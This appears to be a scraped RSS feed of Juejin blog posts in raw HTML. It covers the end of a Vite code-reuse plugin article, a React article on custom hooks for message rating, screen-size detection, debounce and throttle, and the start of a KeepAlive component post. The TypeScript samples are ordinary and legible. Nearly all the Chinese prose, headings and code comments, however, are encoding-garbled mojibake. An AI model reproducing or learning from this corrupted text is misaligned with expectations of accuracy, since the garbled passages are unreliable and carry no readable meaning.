      <span class="hljs-attr">file</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span> 
        ? <span class="hljs-string">'src/components/CheckoutButtonVariantA.vue'</span>
        : <span class="hljs-string">'src/components/CheckoutButtonVariantB.vue'</span>
    }
  ]
})
</code></pre>
<h2 data-id="heading-19">æ€»ç»“</h2>
<p><code>vite-plugin-code-reuse</code> æ’ä»¶ä¸ºæˆ‘ä»¬è§£å†³äº†è·¨é¡¹ç›®ä»£ç å¤ç”¨çš„æ ¸å¿ƒç—›ç‚¹ï¼š</p>
<h3 data-id="heading-20">ğŸ¯ <strong>æ ¸å¿ƒä»·å€¼</strong></h3>
<ol>
<li><strong>å¤§å¹…æå‡å¼€å‘æ•ˆç‡</strong>ï¼šèŠ‚çœ60%+çš„å¼€å‘æ—¶é—´</li>
<li><strong>ä¿è¯ä»£ç ä¸€è‡´æ€§</strong>ï¼šä¸šåŠ¡é€»è¾‘å®Œå…¨ä¸€è‡´ï¼Œå‡å°‘BUG</li>
<li><strong>é™ä½ç»´æŠ¤æˆæœ¬</strong>ï¼šä¸€å¤„ä¿®æ”¹ï¼Œå¤šå¤„ç”Ÿæ•ˆ</li>
<li><strong>çµæ´»å®šåˆ¶</strong>ï¼šUIå±‚å®Œå…¨å¯å®šåˆ¶ï¼Œä¸å½±å“æ ¸å¿ƒé€»è¾‘</li>
</ol>
<h3 data-id="heading-21">ğŸš€ <strong>é€‚ç”¨åœºæ™¯</strong></h3>
<ul>
<li>PCç«¯åˆ°ç§»åŠ¨ç«¯çš„é¡¹ç›®è¿ç§»</li>
<li>å¤šé¡¹ç›®å…±äº«ç»„ä»¶åº“</li>
<li>å¾®å‰ç«¯æ¶æ„ä¸­çš„æ¨¡å—å¤ç”¨</li>
<li>A/Bæµ‹è¯•å’Œå®éªŒæ€§åŠŸèƒ½</li>
</ul>
<p>å¦‚æœä½ ä¹Ÿé¢ä¸´ç±»ä¼¼çš„å¤šé¡¹ç›®ä»£ç å¤ç”¨é—®é¢˜ï¼Œä¸å¦¨è¯•è¯•è¿™ä¸ªæ’ä»¶ã€‚é¡¹ç›®å·²åœ¨GitHubå¼€æºï¼Œæ¬¢è¿Starå’Œè´¡çŒ®ä»£ç ï¼</p>
<p><strong>GitHubåœ°å€</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxlian-fe%2Fvite-plugin-code-reuse" target="_blank" title="https://github.com/xlian-fe/vite-plugin-code-reuse" ref="nofollow noopener noreferrer">vite-plugin-code-reuse</a></p>
<p><strong>è®©ä»£ç å¤ç”¨å˜å¾—ç®€å•ï¼Œè®©å¼€å‘æ•ˆç‡é£èµ·æ¥ï¼</strong> ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React-Hooksé€»è¾‘å¤ç”¨è‰ºæœ¯]]></title>    <link>https://juejin.cn/post/7600990891206787099</link>    <guid>https://juejin.cn/post/7600990891206787099</guid>    <pubDate>2026-01-30T09:38:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891206787099" data-draft-id="7600752623068758026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React-Hooksé€»è¾‘å¤ç”¨è‰ºæœ¯"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-30T09:38:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‘ç°ä¸€åªå¤§å‘†ç“œ"/> <meta itemprop="url" content="https://juejin.cn/user/180747382561607"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React-Hooksé€»è¾‘å¤ç”¨è‰ºæœ¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180747382561607/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‘ç°ä¸€åªå¤§å‘†ç“œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:38:58.000Z" title="Fri Jan 30 2026 09:38:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å‰è¨€</h3>
<p>åœ¨ React å¼€å‘ä¸­ï¼ŒHooks çš„å‡ºç°å½»åº•æ”¹å˜äº†é€»è¾‘å¤ç”¨çš„æ–¹å¼ã€‚å®ƒè®©æˆ‘ä»¬èƒ½å¤Ÿå°†å¤æ‚çš„ã€å¯å¤ç”¨çš„é€»è¾‘ä» UI ç»„ä»¶ä¸­æŠ½ç¦»ï¼Œå®ç°çœŸæ­£çš„â€œå…³æ³¨ç‚¹åˆ†ç¦»â€ã€‚æœ¬æ–‡å°†åˆ†äº« Hooks çš„æ ¸å¿ƒåŸåˆ™ï¼Œå¹¶æä¾› 4 ä¸ªåœ¨çœŸå®ä¸šåŠ¡åœºæ™¯ä¸­å°è£…çš„å®æˆ˜æ¡ˆä¾‹ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€ Hooks æ ¸å¿ƒ</h2>
<h3 data-id="heading-2">1. æ¦‚å¿µç†è§£</h3>
<p>Hooks æœ¬è´¨ä¸Šæ˜¯<strong>å°†ç»„ä»¶é—´å…±äº«çš„é€»è¾‘æŠ½ç¦»å¹¶å°è£…æˆçš„ç‰¹æ®Šå‡½æ•°</strong>ã€‚</p>
<h3 data-id="heading-3">2. ä½¿ç”¨â€œçº¢çº¿â€ï¼šè§„åˆ™ä¸åŸç†</h3>
<ul>
<li><strong>å‘½åè§„èŒƒ</strong>ï¼šå¿…é¡»ä»¥ <code>use</code> å¼€å¤´ï¼ˆå¦‚ <code>useChat</code>ï¼‰ï¼Œè¿™ä¸ä»…æ˜¯çº¦å®šï¼Œä¹Ÿæ˜¯é™æ€æ£€æŸ¥å·¥å…·ï¼ˆESLintï¼‰è¯†åˆ« Hook çš„ä¾æ®ã€‚</li>
<li><strong>è°ƒç”¨ä½ç½®</strong>ï¼š<strong>ä¸¥ç¦åœ¨å¾ªç¯ã€æ¡ä»¶åˆ¤æ–­æˆ–åµŒå¥—å‡½æ•°ä¸­è°ƒç”¨ Hook</strong>ã€‚</li>
</ul>
<p><strong>åº•å±‚åŸç†</strong>ï¼š React å†…éƒ¨å¹¶ä¸æ˜¯é€šè¿‡â€œå˜é‡åâ€æ¥è®°å½• Hook çŠ¶æ€çš„ï¼Œè€Œæ˜¯é€šè¿‡<strong>é“¾è¡¨</strong> ã€‚æ¯æ¬¡æ¸²æŸ“æ—¶ï¼ŒReact ä¸¥æ ¼ä¾èµ– Hook çš„<strong>è°ƒç”¨é¡ºåº</strong>æ¥æŸ¥æ‰¾å¯¹åº”çš„çŠ¶æ€ã€‚</p>
<blockquote>
<p><strong>æ³¨æ„ï¼š</strong> å¦‚æœåœ¨ <code>if</code> è¯­å¥ä¸­è°ƒç”¨ Hookï¼Œä¸€æ—¦æ¡ä»¶ä¸æˆç«‹å¯¼è‡´æŸæ¬¡æ¸²æŸ“è·³è¿‡äº†è¯¥ Hookï¼Œæ•´ä¸ªé“¾è¡¨çš„æŒ‡é’ˆå°±ä¼šé”™ä½ï¼Œå¯¼è‡´çŠ¶æ€è¯»å–å¼‚å¸¸ã€‚</p>
</blockquote>
<h2 data-id="heading-4">äºŒã€ å®æˆ˜ï¼šè‡ªå®šä¹‰ Hooks å°è£…</h2>
<h3 data-id="heading-5">1. AI åœºæ™¯ï¼šæ¶ˆæ¯ç‚¹èµ/ç‚¹è¸©é€»è¾‘ (<code>useChatEvaluate</code>)</h3>
<p>åœ¨ AI å¯¹è¯ç³»ç»Ÿä¸­ï¼Œæ¶ˆæ¯è¯„ä»·æ˜¯é€šç”¨åŠŸèƒ½ã€‚æˆ‘ä»¬éœ€è¦å¤„ç†ï¼šçŠ¶æ€åˆ‡æ¢ï¼ˆç‚¹èµ -&gt; å–æ¶ˆç‚¹èµï¼‰ã€å•é€‰é€»è¾‘ã€ä»¥åŠå¼‚æ­¥æ¥å£è°ƒç”¨ã€‚</p>
<pre><code class="hljs language-TSX" lang="TSX"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// æ¨¡æ‹Ÿæ¥å£</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">public_evaluateMessage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">params: <span class="hljs-built_in">any</span></span>) =&gt; ({ <span class="hljs-attr">data</span>: <span class="hljs-literal">true</span> });

<span class="hljs-keyword">type</span> <span class="hljs-title class_">EvaluateType</span> = <span class="hljs-string">"GOOD"</span> | <span class="hljs-string">"BAD"</span> | <span class="hljs-string">"NONE"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useChatEvaluate</span> = (<span class="hljs-params">initialType: EvaluateType = <span class="hljs-string">"NONE"</span></span>) =&gt; {
  <span class="hljs-keyword">const</span> [ratingType, setRatingType] = useState&lt;<span class="hljs-title class_">EvaluateType</span>&gt;(initialType);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">evaluateMessage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">contentId: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">type</span>: <span class="hljs-string">"GOOD"</span> | <span class="hljs-string">"BAD"</span></span>) =&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-attr">newEvaluateType</span>: <span class="hljs-title class_">EvaluateType</span>;

    <span class="hljs-comment">// é€»è¾‘ï¼šå¦‚æœç‚¹å‡»å·²é€‰ä¸­çš„ç±»å‹ï¼Œåˆ™å–æ¶ˆé€‰ä¸­(NONE)ï¼›å¦åˆ™åˆ‡æ¢åˆ°æ–°ç±»å‹</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> === <span class="hljs-string">"GOOD"</span>) {
      newEvaluateType = ratingType === <span class="hljs-string">"GOOD"</span> ? <span class="hljs-string">"NONE"</span> : <span class="hljs-string">"GOOD"</span>;
    } <span class="hljs-keyword">else</span> {
      newEvaluateType = ratingType === <span class="hljs-string">"BAD"</span> ? <span class="hljs-string">"NONE"</span> : <span class="hljs-string">"BAD"</span>;
    }

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">public_evaluateMessage</span>({
        contentId,
        <span class="hljs-attr">ratingType</span>: newEvaluateType,
        <span class="hljs-attr">content</span>: <span class="hljs-string">""</span>,
      });

      <span class="hljs-keyword">if</span> (res.<span class="hljs-property">data</span> === <span class="hljs-literal">true</span>) {
        <span class="hljs-title function_">setRatingType</span>(newEvaluateType);
      }
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"è¯„ä»·å¤±è´¥:"</span>, error);
    }
  };

  <span class="hljs-keyword">return</span> { ratingType, evaluateMessage };
};

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatMessage</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;{ <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span> }&gt; = <span class="hljs-function">(<span class="hljs-params">{ id }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> { ratingType, evaluateMessage } = <span class="hljs-title function_">useChatEvaluate</span>();
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> evaluateMessage(id, "GOOD")}&gt;
      {ratingType === "GOOD" ? "ğŸ‘ å·²ç‚¹èµ" : "ğŸ‘ ç‚¹èµ"}
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
};
</code></pre>
<hr/>
<h3 data-id="heading-6">2. å“åº”å¼å¸ƒå±€ï¼šå±å¹•å°ºå¯¸ç›‘å¬ (<code>useMediaSize</code>)</h3>
<p>åœ¨å“åº”å¼ç³»ç»Ÿä¸­ï¼Œå°è£…ä¸€ä¸ªèƒ½æ ¹æ®çª—å£å®½åº¦è‡ªåŠ¨åˆ‡æ¢â€œè®¾å¤‡ç±»å‹â€çš„ Hookï¼Œå¯ä»¥æå¤§åœ°ç®€åŒ–å“åº”å¼å¼€å‘ã€‚</p>
<pre><code class="hljs language-TSX" lang="TSX"><span class="hljs-keyword">import</span> { useState, useEffect, useMemo } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">MediaType</span> {
  mobile = <span class="hljs-string">'mobile'</span>,
  tablet = <span class="hljs-string">'tablet'</span>,
  pc = <span class="hljs-string">'pc'</span>,
}

<span class="hljs-keyword">const</span> useMediaSize = (): <span class="hljs-function"><span class="hljs-params">MediaType</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> [width, setWidth] = useState&lt;<span class="hljs-built_in">number</span>&gt;(globalThis.<span class="hljs-property">innerWidth</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleWindowResize</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">setWidth</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>);
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, handleWindowResize);
    <span class="hljs-comment">// è®°å¾—æ¸…ç†äº‹ä»¶ç›‘å¬</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, handleWindowResize);
  }, []);

  <span class="hljs-comment">// ä½¿ç”¨ useMemo é¿å…æ¯æ¬¡æ¸²æŸ“éƒ½é‡æ–°è¿è¡Œè®¡ç®—é€»è¾‘</span>
  <span class="hljs-keyword">const</span> media = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (width &lt;= <span class="hljs-number">640</span>) <span class="hljs-keyword">return</span> <span class="hljs-title class_">MediaType</span>.<span class="hljs-property">mobile</span>;
    <span class="hljs-keyword">if</span> (width &lt;= <span class="hljs-number">768</span>) <span class="hljs-keyword">return</span> <span class="hljs-title class_">MediaType</span>.<span class="hljs-property">tablet</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">MediaType</span>.<span class="hljs-property">pc</span>;
  }, [width]);

  <span class="hljs-keyword">return</span> media;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useMediaSize;
</code></pre>
<hr/>
<h3 data-id="heading-7">3. æ€§èƒ½ä¼˜åŒ–ï¼šé˜²æŠ–ä¸èŠ‚æµ Hook</h3>
<h4 data-id="heading-8">A. é˜²æŠ– Hook (<code>useDebounce</code>)</h4>
<p>å¸¸ç”¨äºæœç´¢æ¡†ï¼Œé˜²æ­¢ç”¨æˆ·å¿«é€Ÿè¾“å…¥æ—¶é¢‘ç¹è§¦å‘è¯·æ±‚ã€‚</p>
<pre><code class="hljs language-TSX" lang="TSX"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> useDebounce&lt;T&gt;(<span class="hljs-attr">value</span>: T, <span class="hljs-attr">delay</span>: <span class="hljs-built_in">number</span>): T {
  <span class="hljs-keyword">const</span> [debouncedValue, setDebouncedValue] = useState&lt;T&gt;(value);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> handler = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">setDebouncedValue</span>(value);
    }, delay);

    <span class="hljs-comment">// å…³é”®ï¼šåœ¨ä¸‹ä¸€æ¬¡ useEffect æ‰§è¡Œå‰æ¸…ç†ä¸Šä¸€æ¬¡çš„å®šæ—¶å™¨</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearTimeout</span>(handler);
  }, [value, delay]);

  <span class="hljs-keyword">return</span> debouncedValue;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useDebounce;
</code></pre>
<h4 data-id="heading-9">B. èŠ‚æµ Hook (<code>useThrottle</code>)</h4>
<p>å¸¸ç”¨äºæ»šåŠ¨åŠ è½½ã€çª—å£ç¼©æ”¾ï¼Œç¡®ä¿åœ¨è§„å®šæ—¶é—´å†…åªæ‰§è¡Œä¸€æ¬¡ã€‚</p>
<pre><code class="hljs language-TSX" lang="TSX"><span class="hljs-keyword">import</span> { useState, useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> useThrottle&lt;T&gt;(<span class="hljs-attr">value</span>: T, <span class="hljs-attr">delay</span>: <span class="hljs-built_in">number</span>): T {
  <span class="hljs-keyword">const</span> [throttledValue, setThrottledValue] = useState&lt;T&gt;(value);
  <span class="hljs-keyword">const</span> lastExecuted = useRef&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>());

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">const</span> remainingTime = delay - (now - lastExecuted.<span class="hljs-property">current</span>);

    <span class="hljs-keyword">if</span> (remainingTime &lt;= <span class="hljs-number">0</span>) {
      <span class="hljs-comment">// ç«‹å³æ‰§è¡Œ</span>
      <span class="hljs-title function_">setThrottledValue</span>(value);
      lastExecuted.<span class="hljs-property">current</span> = now;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// è®¾ç½®å®šæ—¶å™¨å¤„ç†å‰©ä½™æ—¶é—´</span>
      <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">setThrottledValue</span>(value);
        lastExecuted.<span class="hljs-property">current</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
      }, remainingTime);

      <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearTimeout</span>(timer);
    }
  }, [value, delay]);

  <span class="hljs-keyword">return</span> throttledValue;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useThrottle;
</code></pre>
<hr/>
<h2 data-id="heading-10">ä¸‰ã€ æ€»ç»“ï¼šå°è£…è‡ªå®šä¹‰ Hook çš„å¿ƒæ³•</h2>
<ol>
<li><strong>æŠ½ç¦»çŠ¶æ€è€Œéä»…é€»è¾‘</strong>ï¼šå¦‚æœä¸€æ®µé€»è¾‘åªæ¶‰åŠçº¯å‡½æ•°è®¡ç®—ï¼Œä¸éœ€è¦ Hookï¼›åªæœ‰æ¶‰åŠ <code>useState</code> æˆ– <code>useEffect</code> ç­‰çŠ¶æ€ç®¡ç†æ—¶ï¼Œæ‰æœ‰å¿…è¦å°è£… Hookã€‚</li>
<li><strong>ä¿æŒçº¯å‡€</strong>ï¼šè‡ªå®šä¹‰ Hook åº”è¯¥åªå…³å¿ƒé€»è¾‘ï¼Œè€Œä¸åº”è¯¥ç›´æ¥æ“ä½œ DOMã€‚</li>
<li><strong>TS ç±»å‹ä¿æŠ¤</strong>ï¼šåˆ©ç”¨æ³›å‹ <code>&lt;T&gt;</code> å¢å¼º Hook çš„å…¼å®¹æ€§ï¼Œè®©å®ƒèƒ½é€‚é…å„ç§æ•°æ®ç±»å‹ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React æ‰‹å†™å®ç°çš„ KeepAlive ç»„ä»¶ ğŸš€]]></title>    <link>https://juejin.cn/post/7600967006893178889</link>    <guid>https://juejin.cn/post/7600967006893178889</guid>    <pubDate>2026-01-30T09:42:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600967006893178889" data-draft-id="7600705962249191433" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React æ‰‹å†™å®ç°çš„ KeepAlive ç»„ä»¶ ğŸš€"/> <meta itemprop="keywords" content="React.js,é¢è¯•,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T09:42:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xiaoxue_"/> <meta itemprop="url" content="https://juejin.cn/user/4065372122398027"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React æ‰‹å†™å®ç°çš„ KeepAlive ç»„ä»¶ ğŸš€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4065372122398027/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xiaoxue_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:42:50.000Z" title="Fri Jan 30 2026 09:42:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
